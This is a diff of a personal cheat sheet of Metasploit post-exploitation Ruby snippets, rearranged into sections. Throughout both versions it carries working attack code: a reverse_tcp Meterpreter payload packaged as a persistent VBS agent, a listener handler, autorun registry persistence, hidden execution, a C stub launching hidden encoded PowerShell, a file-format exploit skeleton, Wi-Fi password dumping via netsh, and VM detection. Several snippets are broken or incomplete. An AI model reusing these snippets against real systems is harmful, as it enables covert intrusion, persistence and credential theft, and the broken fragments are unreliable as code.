@@ -5,264 +5,92 @@
 ################################################################################
 
 
-
-#
-# store data in loot
-#
-OptBool.new('STORE_LOOT', [false, 'Store file in loot (will simply output file to console if set to false).', true]),
-
-if datastore['STORE_LOOT'] == true
-  data_entry = cmd_exec("ifconfig")
-  store_loot("ifconfig", "text/plain", session, data_entry, "output.txt", "output of ifconfig command")
-end
+## EXECUTE RUBY ONLINE:
+https://www.tutorialspoint.com/execute_ruby_online.php
 
 
 
 
-#
-# display report note to attacker???
-#
-output = client.fs.file.expand_path("%SYSTEMDRIVE%")
-
-report_note(
-  :host_name => session,
-  :type      => "windows.system.path",
-  :data      => output,
-  :update    => :unique_data
-  )
-print_status("System info gather ..")
+########################## STDAPI OPERATIONS ##################################
 
 
 
-#
-# colors in prints (milton@barra)
-#
-print_line("%red" + "[SSA-red_team]")
 
-
-
-#
-# print time (hours)
-#
+## print time (hours)
 print_line("Hello from a metasploit session at #{Time.now}")
 
 
 
-#
-# use backslash to escape double quotes or special caracters
-#
-print_status("sc create #{sname} bin= \"%tmp%\\fg.exe\"")
-
-
-
-#
-# This is my imaginary exploit in ruby
-#
-include Msf::Exploit::FILEFORMAT
-buf = ""
-buf << "A" * 1024
-buf << [0x40201f01].pack("V")
-buf << "\x90" * 10
-buf << payload.encoded
-file_create(buf)
-# module options
-register_options(
-  [
-    OptString.new('FILENAME', [true, 'The malicious file name',  'msf.jpg'])
-  ], self.class)
-
-
-
-
-#
-# build vbs script
-#
-print_status("Creating a persistent agent: LHOST=#{rhost} LPORT=#{rport} (interval=#{delay} onboot=#{install})")
-pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
-pay.datastore['LHOST'] = rhost
-pay.datastore['LPORT'] = rport
-raw  = pay.generate
-vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw, {:persist => true, :delay => 5})
-print_status("Persistent agent script is #{vbs.length} bytes long")
-
-
-
-#
-# start a handler
-#
-mul = client.framework.exploits.create("multi/handler")
-mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
-mul.datastore['LHOST']     = rhost
-mul.datastore['LPORT']     = rport
-mul.datastore['EXITFUNC']  = 'process'
-mul.datastore['ExitOnSession'] = false
-
-mul.exploit_simple(
-  'Payload'        => mul.datastore['PAYLOAD'],
-  'RunAsJob'       => true
-)
-end
-
-
-
-
-#
-# Execute the agent
-#
-proc = session.sys.process.execute("wscript \"#{tempvbs}\"", nil, {'Hidden' => true})
-print_status("Agent executed with PID #{proc.pid}")
-
-
-
-#
-# delete remote file (windows)
-#
+## delete remote file (windows)
 client.fs.file.rm("c:\\oldman\\file.txt")
 
 
 
-#
-# write reg key remote
-#
-nam = Rex::Text.rand_text_alpha(rand(8)+8)
-print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
-  if(key)
-    key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
-    print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-  else
-    print_status("Error: failed to open the registry key for writing")
-  end
-end
+## rename file
+client.fs.file.mv("C:\\oldname","C:\\newname")
 
 
 
-#
-# execute bash (/bin/sh) commands
-#
-cmd_exec("mkdir -m 700 -p /root/test")
-cmd_exec("chmod 777 #{random_file_path}")
-cmd_exec("sh #{random_file_path}")
-system("msfconsole -q -x 'db_status'")
-# read file
-read_file("/proc/scsi/scsi")
+## check if folder its writeable
+client.fs.file.writeable?("C:\\Users\\pedro\\Desktop")
 
 
 
-
-#
-# Execute command and display results
-#
-print_status("Executing command: ifconfig wlan0")
-command_output = cmd_exec("ifconfig wlan0")
-print_line("CONFIGS: #{command_output}")
+## make a directory named "oldman"
+client.fs.dir.mkdir("c:\\oldman")
 
 
 
-#
-# check if application exists (installed)
-if exists_exe?("wget")
-  print_good("wget available, using it")
-end
+### Download file from target system
+# This will download dum.txt from taget and save it to attackers root directory
+client.fs.file.download("/root/dum.txt","%temp%\\dum.txt")
 
 
 
-# Get host name
-  def get_host
-    case session.type
-    when /meterpreter/
-      host = sysinfo["Computer"]
-    when /shell/
-      host = cmd_exec("hostname").chomp
-    end
-
-    print_status("Running module against #{host}")
-    return host
-  end
+## uploads file to target system
+# This will upload dum.txt from attacker system and save it to target root directory
+client.fs.file.upload("C:\\Users\\pedro\\Desktop\\dum.txt","/root/dum.txt")
 
 
 
-#
-# BUILD C template
-#
-exeTEMPLATE = %{#include <stdio.h>
-#include <windows.h>
-int shellCode(){
-	system("color 63");
-	system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}"); 
-	/*
-		((Shell Code into the console))
-	*/
-	return 0;
-}
-void hide(){
-	HWND stealth;
-	AllocConsole();
-	stealth = FindWindowA("ConsoleWindowClass",NULL);
-	ShowWindow (stealth,0);
-}
-int main(){
-	hide();
-	shellCode();
-	return 0;
-}
-}
-
-# write C template to a file
-file_temp = File.new("temp.c", "w")
-file_temp.write(exeTEMPLATE)
-file_temp.close
+## random filename (8 caracters)
+rand = Rex::Text.rand_text_alpha(8)+".log"
+print_good("#{rand} file created")
 
 
 
-#
-# write to a local file
-#
+## use backslash to escape double quotes or special caracters
+print_status("sc create #{sname} bin= \"C:\\Users\\Desktop\fg.exe\"")
+
+
+
+## write to a local file
 File = file.open("/root/test", "w")
-File.write("sc create #{sname} binpath= \"%tmp%\\t.exe\" start= auto") 
+File.write("sc create #{sname} binpath= \"C:\\Users\\Desktop\\test.exe\" start= auto") 
 File.close
 
 
 
-#
-# write file with multiple lines
-#
+## write file with multiple lines
 File.open("/root/hello.sh", "w") {|f| f.write("#!/bin/sh\necho 'hello iam 1º line'\necho 'hello iam the 2º line'\nsleep 3\nexit") }
 
 
 
-#
-# determine if MinGW has been installed, support new and old MinGW system paths
-#
-mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
-if mingw == false
-    print_error("[*] You must have MinGW-32 installed in order to compile EXEs!!")
-    return nil
-end
+## write remote file
+dll_data =
+  "#!/bin/sh" +
+  "xwd -root-out /tmp/screen.xwd" +
+  "exit"
+  
+dllpath = "/tmp/screen.xwd"
+  fd = session.fs.file.new(dllpath, 'wb')
+fd.write(dll_data)
+fd.close
+print_status("Uploaded the persistent agent to #{dllpath}")
 
 
 
-#
-# check for proper operative system
-#
-if session.platform == 'windows'
-if not session.platform.include?("linux")
-
-
-
-#
-# check for proper operative system (windows-not-wine)
-#
-oscheck = client.fs.file.expand_path("%OS%")
-if not oscheck == "Windows_NT"
-  print_error("[ ABORT ]: This module only works againts windows systems")
-  return nil
-end
-
-
-
-
-# write to remote
+## write remote file
 tempdir = client.fs.file.expand_path("%TEMP%")
 tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
 fd = client.fs.file.new(tempvbs, "wb")
@@ -272,36 +100,98 @@ print_status("Uploaded the persistent agent to #{tempvbs}")
 
 
 
+## read file
+read_file("/proc/scsi/scsi")
 
-# Function for creating log folder and returning log path
-#--------------------------------------------------------------------
-def log_file(log_path = nil)
- #Get hostname
-  host = @client.sys.config.sysinfo["Computer"]
-  # Create Filename info to be appended to downloaded files
-  filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
-  # Create a directory for the logs
-  if log_path
-    logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
+
+## Open a file in read mode and copy the content to some variable
+# This will copy all the data inside dum.txt and store it in vtemp variable
+file1 = client.fs.file.new("C:\\Users\\pedro\\Desktp\\dum.txt")
+  vtemp = ""
+  until file1.eof?
+  vtemp << file_object.read
+end
+
+
+
+## check if remote file exists
+print_warning("checking file existance")
+path="C:\\Windows\\system32\\ola.txt"
+if session.fs.file.exist?(path)
+  print_good("file found ..")
+end
+
+
+
+## check IF application exists (installed)
+if exists_exe?("wget")
+  print_good("wget available, using it")
+end
+
+
+
+## check IF directory exists ?????
+get_path = "C:\\windows"
+  if session.fs.dir.exist?(get_path) # error ?? why ???
+    print_good('Vuln path exists')
   else
-    logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
+    print_error("#{get_path} doesn't exist on target")
+end
+
+
+
+# check IF directory exists ????
+get_path = "C:\\windows"
+  if not File.directory?(get_path)
+    print_error("Remote path: #{get_path} not found ..")
+    return nil
   end
 
-# Create the log directory
-::FileUtils.mkdir_p(logs)
 
-#logfile name
-logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
-return logfile
+
+## check IF string inputed contains \
+if app_path.include? "\\"
+
+
+
+## check IF string does NOT contains any \
+if not app_path.include? "\\"
+
+
+## substitution of chars using gsub()
+app_path = 'C:\windows\system32\calc.exe'
+puts "#{app_path}"
+puts "-------------------"
+if app_path.include? "\\"
+  final = app_path.gsub('\\', '\\\\\\')
+  puts "#{final}"
 end
 
 
 
 
-#
-# check for proper operative system (windows 10)
-#
+########################## CHECK TARGET ARCH ##################################
+
+
+
+
+## check FOR proper operative System
+if session.platform == 'windows'
+if not session.platform.include?("linux")
+
+
+
+## check FOR proper operative System (windows-not-wine)
+oscheck = client.fs.file.expand_path("%OS%")
+if not oscheck == "Windows_NT"
+  print_error("[ ABORT ]: This module only works againts windows systems")
+  return nil
+end
+
+
+
+## check FOR operative System
 if not sysinfo['OS'] =~ /Windows 10/
   print_error("[ ABORT ]: This module only works againt windows 10 systems")
   return nil
@@ -309,9 +199,7 @@ end
 
 
 
-#
-# determine target arch
-#
+## determine target arch
 sysarch = sysinfo['Architecture']
   if sysarch == ARCH_X86
     target_compspec = "C:\\Windows\\SysWow64\\cmd.exe"
@@ -321,67 +209,56 @@ sysarch = sysinfo['Architecture']
 
 
 
-#
-# determine taget distro
-#
+## determine taget distro
 target_info = cmd_exec('uname -ms')
-if target_info =~ /linux/
+if target_info =~ /linux/ || target_info =~ /Linux/
   print_status("Platform: Linux")
 end
 
 
 
-
-
- 
-#
-# random filename (8 caracters)
-#
-rand = Rex::Text.rand_text_alpha(8)+".log"
-print_good("#{rand} file created")
-
-
-
-#
-# check if file exists
-#
-print_warning("check if file exists")
-path="%systemroot%\\system32\\ola.txt"
-if session.fs.file.exist?(path)
-  print_good("file found ..")
+## target System check method
+def check
+  vuln = false
+    winver = sysinfo["OS"]
+    affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
+    affected.each { |v|
+      if winver.include? v
+        vuln = true
+        break
+      end
 end
 
 
 
-#
-# make a directory named "oldman" in c drive.
-#
-Syntax: client.fs.dir.mkdir("c:\\oldman")
+
+####################### EXECUTE REMOTE COMMANDS ###############################
 
 
 
-#
-# check if directory exists
-#
-get_path = "C:\\windows"
-  if session.fs.dir.exist?(get_path) # error ?? why ???
-    print_good('Vuln path exists')
-    return Exploit::CheckCode::Appears
-  else
-    print_error("#{get_path} doesn't exist on target")
-    return Exploit::CheckCode::Safe
-end
+
+## execute bash (/bin/sh) commands
+cmd_exec("mkdir -m 700 -p /root/test")
+cmd_exec("chmod 777 #{random_file_path}")
+cmd_exec("sh #{random_file_path}")
+system("msfconsole -q -x 'db_status'")
 
 
-#
-# check if directory exists
-#
-get_path = "C:\\windows"
-  if not File.directory?(get_path)
-    print_error("Remote path: #{get_path} not found ..")
-    print_line("")
-    return nil
-  end
+
+## Execute command and display results
+print_status("Executing command: ifconfig wlan0")
+command_output = cmd_exec("ifconfig wlan0")
+print_line("CONFIGS: #{command_output}")
+
+
+
+## Execute remote command
+proc = session.sys.process.execute("cmd.exe /c start calc.exe", nil, {'Hidden' => true})
+
+
+
+
+########################### LIST PROCESS ##################################
 
 
 
@@ -400,8 +277,7 @@ end
 
 
 
-# List processes
-# get process by name
+## List processes (get process by name)
 def get_winlogon
   session.sys.process.get_processes().each do |x|
     if x['name'].downcase == "winlogon.exe"
@@ -410,244 +286,147 @@ def get_winlogon
 end
 
 
-# check if is a meterpreter session
-print_status("Running module against #{sysnfo['Computer']}") if not sysinfo.nil? 
 
 
-# check if its admin
+########################## VARIOUS CHECKS #################################
+
+
+
+
+## check if is a meterpreter session
+if not sysinfo.nil?
+  print_status("Running module against #{sysnfo['Computer']}")
+end
+
+
+
+## check if its admin
 isadd = is_admin?
 if(isadd)
-print_line('we are admin') 
+  print_line('we are admin') 
 else
-print_line('not admin access level') 
+  print_line('not admin access level') 
 end
 
 
-# check if its system
+
+## check if its system
 issys = is_system?
 if(issys)
-print_line('we are system') 
+  print_line('we are system') 
 else
-print_line('not a system access level') 
+  print_line('not a system access level') 
 end
 
 
 
-#
-# the 'def check()' funtion that rapid7 requires to accept new modules.
-# Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
-#
-def check_host(ip)
-  # variable declarations
-  value = "IsolatedCommand"
-  hive = "HKCU\\Software\\Classes\\exefile\\shell\\runas\\command"
-    # check for hijack registry value existence?
-    if registry_getvaldata("#{hive}","#{value}")
-      return Exploit::CheckCode::Vulnerable
-    # check for registry hive existence?
-    elsif registry_enumkeys("HKCU\\Software\\Classes\\exefile")
-      return Exploit::CheckCode::Appears
-    else
-      return Exploit::CheckCode::Safe
-    end
-end
-
-
-
-#
-# another def check method
-#
-def check
-  vuln = false
-    winver = sysinfo["OS"]
-    affected = [ 'Windows Vista', 'Windows 7', 'Windows 2008' ]
-    affected.each { |v|
-      if winver.include? v
-        vuln = true
-        break
-      end
-end
-
-
-
-#
-# Download file from victims system
-# This will download dum.txt from victims system and will save it to attackers root directory
-#
-client.fs.file.download("/root/dum.txt","%temp%\\dum.txt")
-
-
-
-
-#
-# uploads file fto victims system
-# This will upload dum.txt from attacker system and will save it to target root directory
-#
-client.fs.file.upload("%temp%\\dum.txt","/root/dum.txt")
-
-
-
-
-# Open a file in read mode and copy the content to some variable
-# Comment: This will copy all the data inside dum.txt and store it in vtemp variable
-file1 = client.fs.file.new("%temp%\\dum.txt")
-              vtemp = ""
-              until file1.eof?
-              vtemp << file_object.read
-
-
-
-
-  # Returns true if UAC is enabled
-  #
-  # Returns false if the session is running as system, if uac is disabled or
-  # if running on a system that does not have UAC
-  #
-  def is_uac_enabled?
-    uac = false
-    winversion = session.sys.config.sysinfo['OS']
-
-    if winversion =~ /Windows (Vista|7|8|2008|2012)/
-      unless is_system?
-        begin
-          enable_lua = registry_getvaldata(
-              'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
-              'EnableLUA'
-          )
-          uac = (enable_lua == 1)
-        rescue Rex::Post::Meterpreter::RequestError => e
-          print_error("Error Checking if UAC is Enabled: #{e.class} #{e}")
-        end
-      end
-    end
-    return uac
-  end
-
-  #
-  # Returns the UAC Level
-  #
-  # @see http://technet.microsoft.com/en-us/library/dd835564(v=ws.10).aspx
-  # 2 - Always Notify, 5 - Default, 0 - Disabled
-  #
-  def get_uac_level
-    begin
-      uac_level = registry_getvaldata(
-          'HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System',
-          'ConsentPromptBehaviorAdmin'
-      )
-    rescue Rex::Post::Meterpreter::RequestError => e
-      print_error("Error Checking UAC Level: #{e.class} #{e}")
-    end
-
-    if uac_level
-      return uac_level
-    else
-      return nil
-    end
-  end
-
-
-
-#
-# by darkoperator
-# check powershell version on target
-def checkps2
-  os = sysinfo['OS']
-  if os =~ /windows 2012|2016|7|8|10/
-    print_status('checking if ps2 engine its enable')
-    path = "HKLM\\SOFTWARE\\Microsoft\\Powershell\\1"
-    if registry_enumkeys(path).include?("PowerShellEngine")
-      if registry_getvaldata("#{path}\\PowerShellEngine", 'PowerShellVersion') == '2.0'
-        print_good("\tPowerShell 2.0 engine is enabled")
-        report_note(
-                :host  => session,
-                :type  => 'host.log.ps_v2_feature',
-                :data{
-                  :enabled => true},
-                :update => :unique_data
-             )
-
-      else
-        print_good("\tPowerShell 2.0 engine not enabled")
-                report_note(
-                :host  => session,
-                :type  => 'host.log.ps_v2_feature',
-                :data{
-                  :enabled => false},
-                :update => :unique_data
-             )
-      end
-    end
-  end
-end
-
-
-
-#
-# DUMP PASSWORD FROM SELECTED ESSID WLAN/LAN
-#
-def ls_stage3
-  inuse = datastore['INTERFACE']
-  essid = datastore['DUMP_ESSID']
-  dpath = datastore['DOWNLOAD_PATH']
-  lang = client.sys.config.sysinfo["System Language"]
-
-    if lang =~ /pt/
-      lag = "key"
-    else
-      lag = "Chave"
-    end
-
-    r=''
-    # execute cmd prompt in a hidden channelized windows!
-    # and build dump.log with results (dump) in target %temp% folder
-    # If we want to dump only password of ESSID and not he all profile use "key=clear | findstr Key"
-    r = session.sys.process.execute("cmd.exe /c netsh #{inuse} show profile #{essid} key=clear | findstr #{lag} > %temp%\\dump.log", nil, {'Hidden' => true, 'Channelized' => true})
- 
-       # download 'dump.log' from target machine using one API call
-       print_status(" Dumping Credentials of: #{essid}")
-       client.fs.file.download("#{dpath}/dump.log","%temp%\\dump.log")
-
-    # close channel when done
-    r.channel.close
-    r.close
-
-  # error exception funtion
-  rescue ::Exception => e
-  print_error(" Error: #{e.class} #{e}")
-  print_error(" Try to rise meterpreter session to [nt authority/system] before runing this module")
-end
-
-
-
-#
 # List all the available interface from victims system
 # comment: This will return an array of the first interface available in the victims
 # system along with the details like IP, netmask, mac_address etc
-#
 vtemp = "client.net.config.get_interfaces"
-# display variable to user
 print_good("Interfaces: #{vtemp}")
 
 
 
-#
-# execute an cmd.exe command in target and get the output in attackers side
-#
-r = session.sys.process.execute("cmd.exe /c query user", nil, {'Hidden' => true, 'Channelized' => true})
+## Get host name
+def get_host
+  case session.type
+  when /meterpreter/
+    host = sysinfo["Computer"]
+  when /shell/
+    host = cmd_exec("hostname").chomp
+  end
+  print_status("Running module against #{host}")
+  return host
+end
 
 
 
-#
-# se.. o command nao fizer o display do netsh entao enviar 
-# o display para um log file e fazer o download dele
-#
-r = session.sys.process.execute("cmd.exe /c netsh interface show interface > %temp%\\dum.txt", nil, {'Hidden' => true, 'Channelized' => true})
+## determine if MinGW has been installed, support new and old MinGW system paths
+mingw = true if File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
+if mingw == false
+    print_error("[*] You must have MinGW-32 installed in order to compile EXEs!!")
+    return nil
+end
 
 
-#
-# try to fill a table ???
-#
+
+## determine if we are in a VM System
+if registry_getvaldata('HKLM\HARDWARE\DESCRIPTION\System','SystemBiosVersion') =~ /vbox/i
+  vm = true
+end
+
+if not vm
+  srvvals = registry_enumkeys('HKLM\SYSTEM\ControlSet001\Services')
+    if srvvals and srvvals.include?("VBoxMouse")
+      vm = true
+    elsif srvvals and srvvals.include?("VBoxGuest")
+      vm = true
+    elsif srvvals and srvvals.include?("VBoxService")
+      vm = true
+    elsif srvvals and srvvals.include?("VBoxSF")
+      vm = true
+    end
+end
+
+if vm
+  report_note(
+    :host   => session,
+    :type   => 'host.hypervisor',
+    :data   => { :hypervisor => "VirtualBox" },
+    :update => :unique_data
+    )
+  print_status("This is a Sun VirtualBox Virtual Machine")
+  return "VirtualBox"
+end
+end
+
+
+
+
+######################### VARIABLE OPERATIONS #################################
+
+
+
+
+## store data in loot
+OptBool.new('STORE_LOOT', [false, 'Store file in loot (will simply output file to console if set to false).', true]),
+if datastore['STORE_LOOT'] == true
+  data_entry = cmd_exec("ifconfig")
+  store_loot("ifconfig", "text/plain", session, data_entry, "output.txt", "output of ifconfig command")
+end
+
+
+
+## display report note to attacker???
+output = client.fs.file.expand_path("%SYSTEMDRIVE%")
+report_note(
+  :host_name => session,
+  :type      => "windows.system.path",
+  :data      => output,
+  :update    => :unique_data
+  )
+print_status("System info gather ..")
+
+
+
+## start a handler
+mul = client.framework.exploits.create("multi/handler")
+mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
+mul.datastore['LHOST']     = rhost
+mul.datastore['LPORT']     = rport
+mul.datastore['EXITFUNC']  = 'process'
+mul.datastore['ExitOnSession'] = false
+
+mul.exploit_simple(
+  'Payload'        => mul.datastore['PAYLOAD'],
+  'RunAsJob'       => true
+)
+end
+
+
+
+## try to fill a table ???
           # building table display
           tbl = Rex::Ui::Text::Table.new(
               'Header'  => 'Interfaces Active',
@@ -670,60 +449,98 @@ r = session.sys.process.execute("cmd.exe /c netsh interface show interface > %te
 
 
 
-#
-# This sample demonstrates how a file can be encoded using a framework encoder.
-#
-$:.unshift(File.join(File.dirname(__FILE__), ’..’, ’..’, ’..’,
-’lib’))
+
+########################### WRITING EXPLOITS ##################################
+
+
+
+
+## This is my imaginary exploit in ruby
+include Msf::Exploit::FILEFORMAT
+buf = ""
+buf << "A" * 1024
+buf << [0x40201f01].pack("V")
+buf << "\x90" * 10
+buf << payload.encoded
+file_create(buf)
+
+
+
+## build vbs script
+print_status("Creating a persistent agent: LHOST=#{rhost} LPORT=#{rport} (interval=#{delay} onboot=#{install})")
+pay = client.framework.payloads.create("windows/meterpreter/reverse_tcp")
+pay.datastore['LHOST'] = rhost
+pay.datastore['LPORT'] = rport
+raw  = pay.generate
+vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw, {:persist => true, :delay => 5})
+print_status("Persistent agent script is #{vbs.length} bytes long")
+
+
+
+## BUILD C template
+exeTEMPLATE = %{
+#include <stdio.h>
+#include <windows.h>
+int shellCode(){
+	system("color 63");
+	system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}"); 
+	/*
+		((Shell Code into the console))
+	*/
+	return 0;
+}
+void hide(){
+	HWND stealth;
+	AllocConsole();
+	stealth = FindWindowA("ConsoleWindowClass",NULL);
+	ShowWindow (stealth,0);
+}
+int main(){
+	hide();
+	shellCode();
+	return 0;
+}
+},
+
+# write C template to a file
+file_temp = File.new("temp.c", "w")
+file_temp.write(exeTEMPLATE)
+file_temp.close
+
+
+
+## This sample demonstrates how a file can be encoded using a framework encoder.
 require ’msf/base’
+$:.unshift(File.join(File.dirname(__FILE__), ’..’, ’..’, ’..’,’lib’))
 if (ARGV.empty?)
-puts "Usage: #{File.basename(__FILE__)} encoder_name file_name format"
-exit
+  puts "Usage: #{File.basename(__FILE__)} encoder_name file_name format"
+  return nil
 end
+
 framework = Msf::Simple::Framework.create
 begin
-# Create the encoder instance.
-mod = framework.encoders.create(ARGV.shift)
-puts(Msf::Simple::Buffer.transform(
-mod.encode(IO.readlines(ARGV.shift).join), ARGV.shift || ’ruby’))
-rescue
-puts "Error: #{$!}\n\n#{$@.join("\n")}"
+  # Create the encoder instance.
+  mod = framework.encoders.create(ARGV.shift)
+  puts(Msf::Simple::Buffer.transform(mod.encode(IO.readlines(ARGV.shift).join), ARGV.shift || ’ruby’))
+  rescue
+  puts "Error: #{$!}\n\n#{$@.join("\n")}"
 end
 
 
 
-# --------------------------------------------------------------
-
-
-
-    if not vm
-      if registry_getvaldata('HKLM\HARDWARE\DESCRIPTION\System','SystemBiosVersion') =~ /vbox/i
-        vm = true
-      end
-    end
-    if not vm
-      srvvals = registry_enumkeys('HKLM\SYSTEM\ControlSet001\Services')
-      if srvvals and srvvals.include?("VBoxMouse")
-        vm = true
-      elsif srvvals and srvvals.include?("VBoxGuest")
-        vm = true
-      elsif srvvals and srvvals.include?("VBoxService")
-        vm = true
-      elsif srvvals and srvvals.include?("VBoxSF")
-        vm = true
-      end
-    end
-    if vm
-      report_note(
-        :host   => session,
-        :type   => 'host.hypervisor',
-        :data   => { :hypervisor => "VirtualBox" },
-        :update => :unique_data
-        )
-      print_status("This is a Sun VirtualBox Virtual Machine")
-      return "VirtualBox"
-    end
+## write reg key remote
+nam = Rex::Text.rand_text_alpha(rand(8)+8)
+print_status("Installing into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+key = client.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'Software\Microsoft\Windows\CurrentVersion\Run', KEY_WRITE)
+  if(key)
+    key.set_value(nam, session.sys.registry.type2str("REG_SZ"), tempvbs)
+    print_status("Installed into autorun as HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+  else
+    print_status("Error: failed to open the registry key for writing")
   end
+end
+
+
 
 
 
